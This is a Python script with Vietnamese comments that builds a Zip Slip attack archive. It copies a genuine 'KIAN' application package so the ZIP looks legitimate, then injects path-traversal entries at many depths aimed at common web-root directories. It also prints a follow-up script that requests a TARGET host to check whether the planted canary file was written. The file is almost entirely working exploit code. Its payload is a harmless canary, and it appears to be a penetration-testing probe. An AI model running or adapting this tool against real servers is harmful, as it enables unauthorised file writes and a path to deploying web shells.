"""
Zip Slip payload — copy toàn bộ cấu trúc KIAN gốc + nhét entry path traversal.
ZIP trông hợp lệ 100%, chỉ khác là có thêm file độc hại bên trong.

Usage:
    python zipslip_full.py
    python zipslip_full.py --source "C:\\Users\\Lenovo\\Downloads\\KIAN 2.0.3.zip" --webroot /var/www/html --output payload.zip
"""

import zipfile
import argparse
import os
import itertools
import warnings
warnings.filterwarnings("ignore", category=UserWarning, module="zipfile")

CANARY_FILENAME = "zipslip_probe.txt"
CANARY_CONTENT  = b"ZIPSLIP_CONFIRMED\n"

TRAVERSAL_PATTERNS = ["../", "..\\", "....//"]
DEPTHS = list(range(2, 12))  # depth 2 → 11

DEFAULT_WEBROOTS = [
    "/var/www/html",
    "/var/www",
    "/opt/kian/app/static",
    "/opt/kian/public",
    "/opt/kian/web",
    "/opt/kian/webapp",
    "/usr/share/nginx/html",
    "/app/static",
    "/app/public",
    "/webapps/ROOT",
    "/opt/tomcat/webapps/ROOT",
    "/usr/local/tomcat/webapps/ROOT",
]


def collect_source_files(source_dir: str) -> list[tuple[str, str]]:
    """Trả về list (arc_name, abs_path) của tất cả file trong source_dir."""
    result = []
    for dirpath, _, filenames in os.walk(source_dir):
        for fname in filenames:
            abs_path = os.path.join(dirpath, fname)
            # arc_name là path tương đối từ source_dir, dùng forward slash
            rel = os.path.relpath(abs_path, source_dir).replace("\\", "/")
            result.append((rel, abs_path))
    return result


def build_traversal_entries(webroots: list[str]) -> list[tuple[str, bytes]]:
    """Tạo tất cả entry path traversal (arc_name, content)."""
    entries = []
    seen = set()
    for pattern, depth, webroot in itertools.product(TRAVERSAL_PATTERNS, DEPTHS, webroots):
        traversal = pattern * depth
        root = webroot.lstrip("/\\").replace("\\", "/")
        arc_name = f"{traversal}{root}/{CANARY_FILENAME}"
        if arc_name not in seen:
            seen.add(arc_name)
            entries.append((arc_name, CANARY_CONTENT))
    return entries


def generate(source_dir: str, output: str, webroots: list[str]):
    source_files = collect_source_files(source_dir)
    traversal_entries = build_traversal_entries(webroots)

    print(f"[*] Source files     : {len(source_files)} files từ {source_dir}")
    print(f"[*] Traversal entries: {len(traversal_entries)} variants")
    print(f"[*] Output           : {output}\n")

    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as zf:

        # 1. Copy toàn bộ file gốc
        for arc_name, abs_path in source_files:
            with open(abs_path, "rb") as f:
                data = f.read()
            zf.writestr(zipfile.ZipInfo(arc_name), data)

        # 2. Thêm entry path traversal
        for arc_name, content in traversal_entries:
            info = zipfile.ZipInfo(arc_name)
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, content)

    size = os.path.getsize(output)
    print(f"[+] Done: {output} ({size / 1024:.1f} KB)\n")

    print("=" * 60)
    print("Sau khi import, verify bằng curl:\n")
    print(f"    curl http://TARGET/{CANARY_FILENAME}")
    print()
    print("Nếu trả về 'ZIPSLIP_CONFIRMED' → VULNERABLE\n")
    fn = CANARY_FILENAME
    print("Hoặc chạy verify script:")
    verify = """
import requests, urllib3
urllib3.disable_warnings()

TARGET = "http://TARGET"   # <-- đổi URL thực
FNAME  = \"""" + fn + """\"
CHECK_PATHS = [
    "/" + FNAME, "/static/" + FNAME, "/public/" + FNAME,
    "/app/" + FNAME, "/assets/" + FNAME, "/web/" + FNAME,
]

for path in CHECK_PATHS:
    try:
        r = requests.get(TARGET + path, timeout=5, verify=False)
        if r.status_code == 200 and b"ZIPSLIP_CONFIRMED" in r.content:
            print("[!!!] CONFIRMED: " + TARGET + path)
            break
        print("[ ]  " + str(r.status_code) + " " + path)
    except Exception as e:
        print("[ERR] " + path + ": " + str(e))
"""
    print(verify)


def main():
    default_source = r"C:\Users\Lenovo\Downloads\KIAN 2.0.3.zip"

    parser = argparse.ArgumentParser(description="Zip Slip full payload — copy KIAN gốc + path traversal")
    parser.add_argument("--source",  default=default_source,
                        help=f"Thư mục KIAN gốc (default: {default_source})")
    parser.add_argument("--output",  default="zipslip_full.zip",
                        help="Tên file ZIP đầu ra (default: zipslip_full.zip)")
    parser.add_argument("--webroot", default=None,
                        help="Chỉ định 1 web root cụ thể (mặc định thử nhiều path)")
    args = parser.parse_args()

    if not os.path.isdir(args.source):
        print(f"[ERR] Source dir không tồn tại: {args.source}")
        print(f"      Dùng --source để chỉ định đúng đường dẫn.")
        raise SystemExit(1)

    webroots = [args.webroot] if args.webroot else DEFAULT_WEBROOTS
    generate(args.source, args.output, webroots)


if __name__ == "__main__":
    main()
